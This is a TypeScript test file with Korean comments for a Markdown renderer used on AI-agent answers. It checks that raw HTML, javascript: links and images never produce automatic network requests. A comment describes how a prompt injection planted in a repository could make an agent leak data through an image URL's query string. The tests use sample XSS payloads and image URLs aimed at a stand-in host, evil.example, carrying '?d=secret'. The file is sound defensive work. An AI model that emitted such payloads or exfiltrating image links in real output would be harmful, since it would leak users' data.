import { describe, it, expect } from 'vitest'
import { renderMarkdown } from './useMarkdown'

describe('renderMarkdown (스펙 2026-09-05 §2 답변 렌더링)', () => {
  it('굵게·인라인 코드·목록을 HTML로 렌더한다', () => {
    const html = renderMarkdown('**1. 로그인** `AuthController.login()`\n\n- 항목')
    expect(html).toContain('<strong>1. 로그인</strong>')
    expect(html).toContain('<code>AuthController.login()</code>')
    expect(html).toContain('<li>항목</li>')
  })

  it('원시 HTML은 렌더하지 않고 이스케이프한다 (html:false)', () => {
    const html = renderMarkdown('<script>alert(1)</script> <img src=x onerror=alert(1)>')
    expect(html).not.toContain('<script>')
    expect(html).toContain('&lt;script&gt;')
    expect(html).not.toContain('<img')
  })

  it('javascript: 링크는 버리고, 정상 링크는 새 탭 + noopener', () => {
    expect(renderMarkdown('[x](javascript:alert(1))')).not.toContain('href="javascript:')
    const html = renderMarkdown('[문서](https://example.com/a)')
    expect(html).toContain('href="https://example.com/a"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('한 줄 개행은 <br>, 빈 입력은 빈 문자열', () => {
    expect(renderMarkdown('첫 줄\n둘째 줄')).toContain('<br>')
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown(null)).toBe('')
  })
})

// 에이전트 생성 마크다운은 어떤 경우에도 자동 네트워크 요청을 만들지 않는다 — <img>는 사용자가 아무것도 안 해도
// 브라우저가 src를 요청하므로, 레포에 섞인 프롬프트 인젝션이 쿼리스트링에 데이터를 실어 내보내는 유출 채널이 된다.
describe('renderMarkdown — 이미지는 <img> 대신 클릭해야 열리는 링크 (자동 요청 차단)', () => {
  /** HTML 문자열을 DOM으로 파싱 — 문자열 포함 검사만으로는 속성 위치/중첩을 놓칠 수 있다. */
  function parse(html: string) {
    const root = document.createElement('div')
    root.innerHTML = html
    return root
  }

  it('외부 URL 이미지는 <img> 없이 새 탭 링크로, 표시 텍스트는 [이미지] + alt', () => {
    const html = renderMarkdown('![구성도](https://evil.example/x.png?d=secret)')
    expect(html).not.toMatch(/<img/i)
    const a = parse(html).querySelector('a')!
    expect(a.getAttribute('href')).toBe('https://evil.example/x.png?d=secret')
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    expect(a.classList.contains('md-image-link')).toBe(true)
    expect(a.textContent).toBe('[이미지] 구성도')
  })

  it('alt가 비면 URL을 표시 텍스트로 쓴다 — 퓨니코드는 디코딩하지 않고 href 그대로', () => {
    const a = parse(renderMarkdown('![](https://evil.example/x.png)')).querySelector('a')!
    expect(a.textContent).toBe('[이미지] https://evil.example/x.png')
    const idn = parse(renderMarkdown('![](https://xn--pple-43d.example/x.png)')).querySelector('a')!
    expect(idn.textContent).toBe('[이미지] https://xn--pple-43d.example/x.png')
  })

  it('상대/동일 출처 URL도 링크로 — title은 링크 title로 옮긴다', () => {
    const html = renderMarkdown('![첨부](/api/x.png "캡처 화면")')
    expect(html).not.toMatch(/<img/i)
    const a = parse(html).querySelector('a')!
    expect(a.getAttribute('href')).toBe('/api/x.png')
    expect(a.getAttribute('title')).toBe('캡처 화면')
    expect(a.getAttribute('target')).toBe('_blank')
  })

  it('참조식 이미지(full/collapsed/shortcut)도 링크로', () => {
    const def = '\n\n[r]: https://evil.example/p.png?d=1'
    for (const src of ['![그림][r]', '![r][]', '![r]']) {
      const html = renderMarkdown(src + def)
      expect(html, src).not.toMatch(/<img/i)
      expect(parse(html).querySelector('a')!.getAttribute('href'), src).toBe(
        'https://evil.example/p.png?d=1',
      )
    }
  })

  it('링크 안 이미지(배지 패턴)는 바깥 링크 하나만 남기고 이미지 URL은 링크로 만들지 않는다', () => {
    for (const src of [
      '[![CI](https://evil.example/b.svg?d=1)](https://example.com/ci)',
      '[![CI][img]][ci]\n\n[img]: https://evil.example/b.svg?d=1\n[ci]: https://example.com/ci',
    ]) {
      const html = renderMarkdown(src)
      expect(html, src).not.toMatch(/<img/i)
      expect(html, src).not.toContain('evil.example')
      const anchors = parse(html).querySelectorAll('a')
      expect(anchors, src).toHaveLength(1)
      expect(anchors[0]!.getAttribute('href'), src).toBe('https://example.com/ci')
      expect(anchors[0]!.getAttribute('rel'), src).toBe('noopener noreferrer')
      expect(anchors[0]!.textContent, src).toBe('[이미지] CI')
    }
  })

  it('대문자 스킴·엔티티 인코딩 URL도 <img>가 되지 않는다', () => {
    for (const src of [
      '![a](HTTPS://EVIL.example/x.png)',
      '![a](&#104;ttps://evil.example/x)',
      '![a](&#x68;ttps://evil.example/x)',
      '![a](<https://evil.example/a b.png>)',
      '![a](//evil.example/x.png)',
    ]) {
      const html = renderMarkdown(src)
      expect(html, src).not.toMatch(/<img/i)
      expect(parse(html).querySelector('a.md-image-link'), src).not.toBeNull()
    }
  })

  it('강조·목록·표 안의 이미지도 링크로', () => {
    const html = renderMarkdown(
      '**![a](https://evil.example/1.png)**\n\n- ![b](https://evil.example/2.png)\n\n| c |\n|---|\n| ![d](https://evil.example/3.png) |',
    )
    expect(html).not.toMatch(/<img/i)
    expect(parse(html).querySelectorAll('a.md-image-link')).toHaveLength(3)
  })

  // data:image(png/gif/jpeg/webp)는 markdown-it validateLink가 통과시키고 네트워크 요청도 없지만 인라인 <img>로도
  // 그리지 않는다(정책 결정: LLM 답변에 쓸 일이 없고 압축폭탄·UI 위장 표면만 늘린다). 브라우저가 data: URL로의
  // 최상위 이동을 막으므로 링크도 걸지 않고 표식+alt 텍스트만 남긴다.
  it('data:image는 인라인 <img>도 링크도 아닌 텍스트 표식만 남긴다 (대소문자·엔티티 포함)', () => {
    for (const src of [
      '![로고](data:image/png;base64,iVBORw0KGgo=)',
      '![로고](DATA:IMAGE/PNG;base64,iVBORw0KGgo=)',
      '![로고](&#x64;ata:image/gif;base64,R0lGOD=)',
      '![로고](data:image/webp;base64,UklGR=)',
    ]) {
      const html = renderMarkdown(src)
      expect(html, src).not.toMatch(/<img/i)
      expect(html, src).not.toMatch(/data:/i)
      const root = parse(html)
      expect(root.querySelector('a'), src).toBeNull()
      expect(root.querySelector('.md-image-omitted')!.textContent, src).toBe('[이미지] 로고')
    }
  })

  it('data:image의 alt가 비면 URL(base64) 대신 표식만 남긴다', () => {
    const html = renderMarkdown('![](data:image/png;base64,iVBORw0KGgo=)')
    expect(html).not.toMatch(/data:/i)
    expect(parse(html).querySelector('.md-image-omitted')!.textContent).toBe('[이미지]')
  })

  it('validateLink가 거르는 스킴(javascript:/svg data:/vbscript:)과 빈 src도 <img>·링크를 만들지 않는다', () => {
    for (const src of [
      '![a](javascript:alert(1))',
      '![a](data:image/svg+xml;base64,PHN2Zz4=)',
      '![a](vbscript:msgbox(1))',
      '![a]()',
      '![a](<>)',
    ]) {
      const html = renderMarkdown(src)
      expect(html, src).not.toMatch(/<img/i)
      expect(html, src).not.toMatch(/href=/i)
    }
  })

  it('alt 안의 마크업·엔티티는 텍스트로 이스케이프된다', () => {
    const html = renderMarkdown('![<b>x</b> &amp; `y` **z**](https://evil.example/a.png)')
    expect(html).not.toContain('<b>')
    expect(html).not.toContain('<strong>')
    const a = parse(html).querySelector('a')!
    expect(a.children).toHaveLength(0)
    expect(a.textContent).toBe('[이미지] <b>x</b> & y z')
  })

  it('코드 블록·인라인 코드 안의 이미지 문법은 코드 텍스트 그대로 둔다', () => {
    const html = renderMarkdown('`![a](https://e.example/x.png)`\n\n```\n![b](https://e.example/y.png)\n```')
    expect(html).not.toMatch(/<img/i)
    expect(html).not.toContain('<a')
    expect(html).toContain('<code>![a](https://e.example/x.png)</code>')
    expect(html).toContain('![b](https://e.example/y.png)\n</code></pre>')
  })

  it('일반 링크·오토링크는 기존대로 (이미지 표식 없음)', () => {
    const html = renderMarkdown('[문서](https://example.com/a) <https://example.com/b>')
    const anchors = parse(html).querySelectorAll('a')
    expect(anchors).toHaveLength(2)
    for (const a of anchors) {
      expect(a.classList.contains('md-image-link')).toBe(false)
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    }
    expect(anchors[0]!.textContent).toBe('문서')
  })
})
